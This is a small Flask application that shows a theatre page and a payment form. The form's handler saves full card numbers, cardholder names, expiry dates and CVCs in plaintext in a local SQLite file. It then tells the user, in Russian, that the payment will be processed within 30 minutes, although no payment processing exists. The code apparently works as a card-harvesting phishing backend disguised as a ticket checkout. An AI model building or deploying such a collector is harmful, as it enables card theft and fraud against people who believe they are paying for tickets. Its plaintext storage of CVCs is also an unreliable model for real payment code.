from flask import Flask, request, redirect, url_for, render_template
from flask_sqlalchemy import SQLAlchemy
import os
from datetime import datetime

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(app.root_path, 'payments.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class Payment(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    card_number = db.Column(db.String(16), nullable=False)
    card_name = db.Column(db.String(50), nullable=False)
    expiry_date = db.Column(db.String(5), nullable=False)
    cvc = db.Column(db.String(3), nullable=False)
    promo_code = db.Column(db.String(20))
    created_at = db.Column(db.DateTime, default=datetime.now)

    def __repr__(self):
        return f'<Payment {self.id} {self.card_name}>'

with app.app_context():
    db.create_all()

@app.route('/')
def index():
    return render_template('theatre.html')

@app.route('/payment')
def payment_form():
    return render_template('payment.html')

@app.route('/process_payment', methods=['POST'])
def process_payment():
    if request.method == 'POST':
        card_number = request.form['card_number'].replace(' ', '')
        card_name = request.form['card_name']
        expiry_date = request.form['expiry_date']
        cvc = request.form['cvc']
        promo_code = request.form.get('promo_code', '')

        new_payment = Payment(
            card_number=card_number,
            card_name=card_name,
            expiry_date=expiry_date,
            cvc=cvc,
            promo_code=promo_code
        )

        db.session.add(new_payment)
        db.session.commit()

        return redirect(url_for('payment_success'))

@app.route('/success')
def payment_success():
    return "Платеж обработается в течение 30 минут!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
